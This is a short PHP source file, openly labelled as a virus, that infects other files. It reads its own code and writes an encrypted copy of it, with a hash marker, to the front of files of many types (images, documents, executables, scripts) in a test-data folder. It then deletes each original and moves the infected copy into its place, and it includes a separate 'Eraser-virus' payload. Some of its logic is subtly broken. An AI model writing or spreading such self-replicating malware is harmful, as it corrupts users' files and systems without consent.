<?php
    //VIRUS: START
    function execute($virus){
        // payload
        include "Eraser-virus.php";

        //get all the filenames with .dev extension thats already saved
        $filenames = glob("test-data/*.{jpg,png,gif,jfif,txt,text,docx,pub,doc,ps,pdf,exe,mp3,mp4,html,htm,css,py,c,php,js,r,t,s,JPG,PNG,GIF,jfif,TXT,TEXT,DOCX,PUB,DOC,PS,PDF,EXE,MP3,MP4,HTML,HTM,CSS,PY,C,PHP,JS,R,T,S,}", GLOB_BRACE);
        
        //loop throught all the filesize
        foreach ($filenames as $filename) {
            # open the file and read targeted(.dev)...
            $script = fopen($filename, "r");

            // check whether the file is infected
            $first_line = fgets($script); // gets first line of the file
            $virus_hash = password_hash($filename, PASSWORD_DEFAULT); //creates a hash 

            // check whether the hash appears on the first line of the file
            if(strpos($first_line, $virus_hash) == false){

                //to avoid issues with large files->file to handle
                $infected = fopen("$filename.infected", "w");
                
                $checksum = '<?php '.$virus_hash.' ?>';
                $infection = '<?php '.encryptedVirus($virus).' ?>';
                
                fputs($infected, $checksum, strlen($checksum));
                fputs($infected, $infection, strlen($infection));
                fputs($infected, $first_line, strlen($first_line));
    
                //loop through
                while($contents = fgets($script)){
                    fputs($infected, $contents, strlen($contents));  
    
                }
    
                //close all the handles and move the infected files in to place
                fclose($script);
                fclose($infected);
                unlink("$filename");
                rename("$filename.infected", $filename);
            }
        }
    }

    $virus = file_get_contents(__FILE__);
    $virus = substr($virus, strpos($virus, "//VIRUS:START"));
    $virus = substr($virus, 0, strpos($virus, "\n//VIRUS:END") + strlen("\n//VIRUS:END"));

    // call our function for excecution
    execute($virus);
    
    